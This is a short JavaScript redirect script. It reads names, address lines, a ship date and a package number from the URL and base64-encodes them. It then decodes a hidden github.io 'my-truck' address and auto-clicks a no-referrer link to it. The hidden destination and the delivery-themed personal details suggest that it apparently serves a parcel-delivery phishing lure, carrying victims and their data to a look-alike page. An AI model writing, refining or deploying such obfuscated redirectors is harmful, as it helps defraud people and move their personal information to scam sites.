function ben(str) {
    const bb = btoa(unescape(encodeURIComponent(str)));
    return bb.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

const p = new URLSearchParams(window.location.search);
const t = p.get('t');
let w = "";

if (t === 'b') {
    const b = p.get('b');
    if (b !== null && b !== "") {
        w = "?q=" + b;
    }
} else if (t === 'g') {
    const data = {
        firstName:     p.get('firstName')     ?? "",
        lastName:      p.get('lastName')      ?? "",
        address1:      p.get('address1')      ?? "",
        address2:      p.get('address2')      ?? "",
        shipDate:      p.get('shipDate')      ?? "",
        packageNumber: p.get('packageNumber') ?? "",
    };
    w = "?q=" + ben(JSON.stringify(data));
}

const a = document.createElement("a");
const x = atob('LmdpdGh1Yi5pbw==');
const u = atob('aHR0cHM6Ly9zYW15cm91Z2VhdXQ=');
const z = atob('L215LXRydWNrLmh0bWw=');
a.href = u + x + z + w;
a.rel = "noreferrer";

document.body.appendChild(a);
a.click();
